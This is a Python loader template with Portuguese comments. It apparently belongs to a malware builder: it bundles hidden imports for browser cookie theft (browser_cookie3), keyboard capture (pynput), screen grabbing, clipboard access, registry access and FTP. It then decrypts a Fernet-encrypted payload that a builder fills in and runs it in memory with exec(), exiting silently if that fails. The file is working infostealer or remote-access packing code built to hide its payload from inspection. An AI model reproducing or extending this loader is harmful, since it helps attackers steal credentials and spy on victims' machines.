import base64
from cryptography.fernet import Fernet
import sys
import os
import traceback

# ==================================================================
#                       INÍCIO DA CORREÇÃO DEFINITIVA
# ==================================================================
# --- IMPORTAÇÕES OCULTAS PARA O COMPILADOR ---
# Adicionando todas as dependências do seu agent.py para garantir que o
# PyInstaller/Nuitka as inclua no executável final.

try:
    # --- Bibliotecas de Terceiros Essenciais ---
    import requests
    import numpy
    import cv2
    import pynput
    import psutil
    import browser_cookie3
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import pad, unpad
    from Cryptodome.Random import get_random_bytes
    # cryptography.hazmat — necessário para encrypt_data/decrypt_data do agente
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    from PIL import ImageGrab

    # --- pywin32 (pythoncom + win32com DEVEM aparecer aqui para PyInstaller detectar) ---
    import pythoncom
    import win32com.client
    import win32com.shell
    import win32api
    import win32gui
    import win32con
    import win32clipboard
    import win32security

    # --- Biblioteca Padrão (Altamente Recomendado) ---
    import sqlite3
    import json
    import winreg
    import shutil
    import time
    import platform
    import socket
    import uuid
    import string
    import subprocess
    import random
    import importlib
    import ctypes
    import threading
    import ipaddress
    import hmac
    import hashlib
    import tempfile
    import ftplib
    from datetime import datetime
    from http.server import HTTPServer, BaseHTTPRequestHandler
    from socketserver import ThreadingMixIn
    import os

except ImportError:
    pass

ENCRYPTED_PAYLOAD = "%%ENCRYPTED_PAYLOAD%%"
%%KEY_RECONSTRUCTION%%

def run_in_memory(payload_code):
    """Executa o código do payload no contexto do módulo atual."""
    exec(payload_code, globals())

def main():
    # Canário do loader — aparece ANTES do exec() do payload.
    # Se este arquivo aparecer mas nenhum CANARY_1_MODULE_OK.txt, o crash é
    # dentro do exec() (importação no topo do agent.py ou erro de ofuscação).
    _base = (os.path.dirname(sys.executable)
             if getattr(sys, 'frozen', False)
             else os.path.dirname(os.path.abspath(__file__)))
    try:
        with open(os.path.join(_base, "CANARY_0_LOADER_OK.txt"), "w") as _f:
            _f.write("loader reached main()\n")
    except Exception:
        pass

    try:
        key = _FKEY
        encrypted_data = base64.b64decode(ENCRYPTED_PAYLOAD)
        cipher = Fernet(key)
        decrypted_payload = cipher.decrypt(encrypted_data)
        run_in_memory(decrypted_payload.decode('utf-8'))
    except Exception as _e:
        # Registra o erro para diagnóstico antes de sair silenciosamente.
        try:
            with open(os.path.join(_base, "CANARY_0_LOADER_FAIL.txt"), "w") as _f:
                import traceback as _tb
                _f.write(f"Loader exec falhou:\n{_tb.format_exc()}\n")
        except Exception:
            pass
        sys.exit(0)

if __name__ == "__main__":
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        pass
    main()
